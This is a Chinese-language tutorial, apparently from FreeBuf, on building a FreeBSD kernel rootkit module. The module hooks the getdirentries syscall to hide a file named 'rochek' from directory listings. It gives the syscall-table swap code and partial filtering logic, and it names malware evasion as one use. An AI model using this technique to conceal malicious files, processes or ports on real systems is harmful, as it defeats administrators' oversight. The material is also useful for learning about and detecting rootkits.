**这是一个在内核里hook来隐藏文件的程序，可以在FreeBSD 11上使用。**  

## 背景

很多情况下，我们会有这样的需求，隐藏文件，隐藏端口，隐藏进程等。

例如

> 某服务需要的关键性文件为了防止被攻击，需要隐藏;
>
> 病毒为了躲避追杀，隐藏自己的文件、进程。

这里，就如何隐藏文件，做一个简单的hook。其它的需求，例如隐藏进程等，思路相似，很容易就可以迁移使用。

## 思路

单就实现方法来说，有两种比较容易想到的思路：

### 1\. 首先请求当前列表，再除去想要隐藏的东西，返回给上层。

这个东西可以做在用户层，也可以做在内核层。

共通的一点，都是使用hook的方法。

### 2\. 直接在资源列表内删除该项目，再写一个特殊的方法来访问这个资源。

这个方法有一定的危险性，这里不作讨论。

本文使用第一种方案，来达到隐藏文件的目的。

作为举例，使用FreeBSD 11作为实现平台。

如果你对FreeBSD不太熟悉，可以先看下我之前在FreeBuf写的这篇文章。

> 一个FreeBSD下的通信协议监控程序：<http://www.freebuf.com/geek/179036.html>：

## 基础知识

首先，我们需要知道在系统内核是怎样处理文件列表请求的。

如果你在安装FreeBSD时，安装了FreeBSD源码，那么这个函数在/usr/src/sys/kern/vfs_syscalls.c内。

    
    
    intsys_getdirentries(struct thread *td, struct getdirentries_args *uap){    long base;    int error;    error = kern_getdirentries(td, uap->fd, uap->buf, uap->count, &base,        NULL, UIO_USERSPACE);    if (error != 0)        return (error);    if (uap->basep != NULL)        error = copyout(&base, uap->basep, sizeof(long));    return (error);}intkern_getdirentries(struct thread *td, int fd, char *buf, u_int count,    long *basep, ssize_t *residp, enum uio_seg bufseg){    struct vnode *vp;    struct file *fp;    struct uio auio;    struct iovec aiov;    cap_rights_t rights;    long loff;    int error, eofflag;    off_t foffset;    AUDIT_ARG_FD(fd);    if (count > IOSIZE_MAX)        return (EINVAL);    auio.uio_resid = count;    error = getvnode(td, fd, cap_rights_init(&rights, CAP_READ), &fp);    if (error != 0)        return (error);    if ((fp->f_flag & FREAD) == 0) {        fdrop(fp, td);        return (EBADF);    }    vp = fp->f_vnode;    foffset = foffset_lock(fp, 0);unionread:    if (vp->v_type != VDIR) {        error = EINVAL;        goto fail;    }    aiov.iov_base = buf;    aiov.iov_len = count;    auio.uio_iov = &ampaiov    auio.uio_iovcnt = 1;    auio.uio_rw = UIO_READ;    auio.uio_segflg = bufseg;    auio.uio_td = td;    vn_lock(vp, LK_SHARED | LK_RETRY);    AUDIT_ARG_VNODE1(vp);    loff = auio.uio_offset = foffset;#ifdef MAC    error = mac_vnode_check_readdir(td->td_ucred, vp);    if (error == 0)#endif        error = VOP_READDIR(vp, &auio, fp->f_cred, &eofflag, NULL,            NULL);    foffset = auio.uio_offset;    if (error != 0) {        VOP_UNLOCK(vp, 0);        goto fail;    }    if (count == auio.uio_resid &&        (vp->v_vflag & VV_ROOT) &&        (vp->v_mount->mnt_flag & MNT_UNION)) {        struct vnode *tvp = vp;        vp = vp->v_mount->mnt_vnodecovered;        VREF(vp);        fp->f_vnode = vp;        fp->f_data = vp;        foffset = 0;        vput(tvp);        goto unionread;    }    VOP_UNLOCK(vp, 0);    *basep = loff;    if (residp != NULL)        *residp = auio.uio_resid;    td->td_retval[0] = count - auio.uio_resid;fail:    foffset_unlock(fp, foffset, 0);    fdrop(fp, td);    return (error);}
    

内核在收到用户层对某个fd的getdirentries请求时，调用kern_getdirentries()返回结果。

在kern_getdirentries()内，会寻找目标fd的vnode，然后针对这个vnode，加锁，复制列表到iovec。

如果全部介绍vnode和iovec的话，可能会比较耗费篇幅，这里简单的说一下。

vnode可以简单的理解成内核在操作文件、目录时使用的东西。

iovec则可以看作是操作缓存。

如果对这些感兴趣的话，可以在FreeBSD内核源码中查看具体的实现。

那么，经过以上步骤，入参fd的目录信息就被复制到uap->buf内了。

这个缓存实质上是一系列的dirent的结构体，如果需要隐藏某个文件，把dirent里的对应内容删掉就可以了。

开始干活。

## 具体实现

首先，定义一个和sys_getdirentries()一样的函数。

    
    
    static intgetdirentries_hook(struct thread *td, struct getdirentries_args *uap);
    

然后，写一个载入内核组建的载入函数，在组件加载时替换函数指针，在卸载时还原。

    
    
    static int
    load(struct module *module, int cmd, void *arg)
    {
        int error = 0;
    
        switch (cmd) {
        case MOD_LOAD:
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
            break;
    
        case MOD_UNLOAD:
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
            break;
    
        default:
            error = EOPNOTSUPP;
            break;
        }
    
        return(error);
    }
    

下面就可以设计这个hook函数了。

首先理清思路。

> 1\. 使用原始的函数，获取输出;
>
> 2\. 检查输出list里是否含有隐藏的文件，有则将其删除。

在之前的kern_getdirentries()可以看到，size是存在td->td_retval[0]内的。

所以，步骤1的实现应该是，获取返回数据，检查是否真正存在数据。

    
    
    sys_getdirentries(td, uap);size = td->td_retval[0];if (size > 0) {    ...}
    

在确认数据存在后，把uap->buf的数据放回内核层，然后就可以读取数据了。

那么进行步骤2。

在读取数据时，由于最后一个路径是NULL，因此需要一个和size同样值的缓存sum来计数。

假设在一开始指向实际数据区的dirent型指针为p，读取数据的过程应该是这样。

    
    
    loop_start:if ((p->d_reclen != 0) && (sum > 0)) {    sum -= ct->d_reclen;    ...    if (sum != 0) {        p = (struct dirent *)((char *)p + p->d_reclen);    }    goto loop_start;}
    loop_end:
    ...
    

接下来，假设需要隐藏的文件叫做rochek。

对比文件名，如果对比成功，覆盖掉。

    
    
    if (strcmp((char *)&(p->d_name), "rochek") == 0) {    if (sum != 0) {    bcopy((char *)p + p->d_reclen, p, sum);    }    size -= p->d_reclen;    goto loop_end;}
    

最后，把缓存的size还给td->td_retval[0]，再把数据复制回去，这个函数就完成了。

实际效果：

![2018-08-12
21-26-18屏幕截图.png](https://image.3001.net/images/20180812/1534080404_5b7035947ae7d.png!small)

分别为rootkit未加载，rootkit加载后，rootkit卸载后查看test目录的结果。

## 总结

这样，就完成了一个FreeBSD下内核级的文件隐藏程序。

使用类似思路，可以做一些其它的事情，例如隐藏进程、隐藏端口等，这里就不做过多的讨论了。

实时上，这种隐藏很容易就可以使用更加专业的检测工具，例如ossec检测到。

至于如何反检测，思路和隐藏文件的思路相似，这里不做过多的讨论。

最后，祝享受hack内核的过程。

 ***本文作者：rochek，转载请注明来自FreeBuf.COM**

